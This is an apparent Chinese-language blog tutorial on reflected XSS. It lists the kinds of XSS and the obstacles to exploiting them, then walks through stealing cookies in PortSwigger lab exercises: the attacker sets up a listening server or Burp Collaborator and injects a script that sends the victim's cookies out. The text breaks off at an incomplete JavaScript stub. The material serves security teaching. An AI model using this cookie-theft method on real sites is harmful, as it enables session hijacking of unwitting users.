---
title: "反射性 XSS 知解 123"
author: Neal
tags: [reflection xss,xss]
keywords: [xss,web安全,渗透测试]
categories: [web安全]
date: "2020-01-04" 
---

跨站脚本攻击（Cross-Site Scripting），为了避免与 CSS 混淆，一般简称为 XSS。XSS 作为一种典型的主要可以分为 3 种：

* 反射型 XSS
* 存储型 XSS
* DOM 型 XSS

关于这 3 种 XSS 类型的区别，在这就不展开了，本文主要讲解 XSS 漏洞的利用场景以及如何测试反射型 XSS，当然反射型 XSS 漏洞的测试和其它 XSS 漏洞类型的测试存在很多共同之处的。通常来说，通过 XSS 漏洞攻击者可以在受害者机器上执行任何脚本的话，包括：

* 可以执行受害者可以执行的任何操作
* 可以浏览受害者可以浏览的任何内容
* 可以修改受害者可以修改的任何信息
* 可以通过最初的受害者与应用中其他用户交互，从而发起对其他用户的攻击

不过值得注意的是，反射型 XSS 总漏洞利用过程中也会遇到较多的障碍，经常可能会遇到很多限制：

* cookie 设置为 httponly，无法通过 JS 直接操控 cookie
* 用户输入的内容被进行过滤或者编码
* 受害者可能并没有登录应用，或者应用用户会话与特定的因素有绑定关系，比如 IP 地址或者 MAC 地址，这种情况比较少见

## 典型利用场景

XSS 的利用场景其实是五花八门的，可以说只要你敢想，搞不好你就可以做得到。这里，我们可以选择两个最典型的利用场景进行讲解。在这里我主要使用 PortSwigger 的应用安全学院里面的 lab 进行讲解。

### 盗取 cookie

通过 XSS 漏洞盗取 cookie 可以说是最典型的利用场景了。不过现在随着 HttpOnly 的广泛应用，这一利用场景也产生了一些限制。但是 HttpOnly 也并不能完全保证 XSS 漏洞的防范，因为 HttpOnly 理论上应该覆盖所有的敏感 cookie，如果有一处没有覆盖到，就有被攻击的可能性。另外一方面，通过结合 CORS 也有突破限制的可能性。还有一个实际情况是，仍然有很多应用并没有使用 HttpOnly，本节也主要是针对这一情形的具体利用。

假设有一个博客平台，目前我们已经发现博文的评论处存在存储型 XSS 漏洞。那么如果其它用户打开这一篇博文，就可以通过这个漏洞让这名用户执行任意 JS 脚本，基本上就可以进行任何操作。如果这一名用户是管理员的话，那么危害性就更大，理论上这个管理用在这个博客可以执行的任何操作，攻击者都可以实现。这个攻击场景主要分为三步：

1. 攻击者创建一个 Web 服务，需要保证受害者和这个服务之间是连通的。
2. 注入 XSS 的 payload，实现通过 JS 获取受害者 cookie，并发送给攻击者创建的服务
3. 攻击者通过获取的 cookie 则可以成为应用的合法用户并执行任何操作

创建 web 服务非常简单，可以使用 python 命令既可以创建服务，`python -m SimpleHTTPServer 80`。这样就可以指定一个监听 80 端口的 web 服务。其实 Burp 提供了一个非常实用的利用功能，通过 Burp Collobrator Client 就可以创建一个开放在外网的 web 服务，这样如果你在日常测试中，就无须自己准备一个带有固定 IP 的服务器来创建服务了。

![3ExZJH.png](https://s2.ax1x.com/2020/02/19/3ExZJH.png)

![3Exlef.png](https://s2.ax1x.com/2020/02/19/3Exlef.png)

进入到 Collobrator Client，点击 Copy to clipborad 就可以将服务地址复制到剪切板。我们可以使用 curl 来进行测试：

![3tuMAU.gif](https://s2.ax1x.com/2020/02/25/3tuMAU.gif)

我们可以看到在 client 中可以看到 DNS 请求以及相应的 HTTP 请求，这样通过 Collobrator Client 就不需要在外网自己的服务器下搭建服务。让我们继续重现上面的利用过程，首先我们可以先创建漏洞利用的 JS 脚本：

```javascript
function sendCookie() {
    var server = "";
    var xhr = new XMLHttpRequest();
    xhr.send()
}




